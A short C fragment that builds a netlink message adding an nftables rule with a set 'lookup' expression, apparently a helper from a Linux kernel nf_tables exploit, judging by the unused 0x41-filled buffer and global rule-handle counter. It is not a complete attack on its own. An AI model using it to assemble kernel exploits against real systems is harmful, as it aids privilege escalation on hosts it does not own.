extern int cur_handle;
#define htonll(x) ((1==htonl(1)) ? (x) : ((uint64_t)htonl((x) & 0xFFFFFFFF) << 32) | htonl((x) >> 32))

struct nlmsghdr * new_rule_lookup_for_chain_msg(char *table_name, char *chain_name, char *set_name, int if_dreg){
    struct nl_msg * msg2 = nlmsg_alloc();
    struct nlmsghdr *hdr2 = nlmsg_put(
            msg2,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            (NFNL_SUBSYS_NFTABLES << 8) | (NFT_MSG_NEWRULE),// TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST|NLM_F_CREATE //NLM_F_ECHO
    );
    struct nfgenmsg * h2 = malloc(sizeof(struct nfgenmsg));
    h2->nfgen_family = 2;//NFPROTO_IPV4;
    h2->version = 0;
    h2->res_id = NFNL_SUBSYS_NFTABLES;
    memcpy(nlmsg_data(hdr2), h2, sizeof(struct nfgenmsg));
    struct nl_msg * exprs = nlmsg_alloc();
    struct nl_msg *data_nest = nlmsg_alloc();
    struct nl_msg *expr_data = nlmsg_alloc();

    char *a = malloc(0x100);
    memset(a,0x41,0x100);
    if(if_dreg)
    	nla_put_u32(expr_data, NFTA_LOOKUP_DREG, htonl(NFT_REG_2));
    nla_put_string(expr_data, NFTA_LOOKUP_SET, set_name);
    nla_put_u32(expr_data, NFTA_LOOKUP_SREG, htonl(NFT_REG_1));
    nla_put_string(data_nest, NFTA_EXPR_NAME, "lookup");
    nla_put_nested(data_nest, NFTA_EXPR_DATA, expr_data);

    nla_put_nested(exprs, NFTA_LIST_ELEM, data_nest);
    nla_put_string(msg2, NFTA_RULE_TABLE, table_name);
    nla_put_string(msg2, NFTA_RULE_CHAIN, chain_name);
    nla_put_nested(msg2, NFTA_RULE_EXPRESSIONS, exprs);
    cur_handle++;
    return hdr2;
}
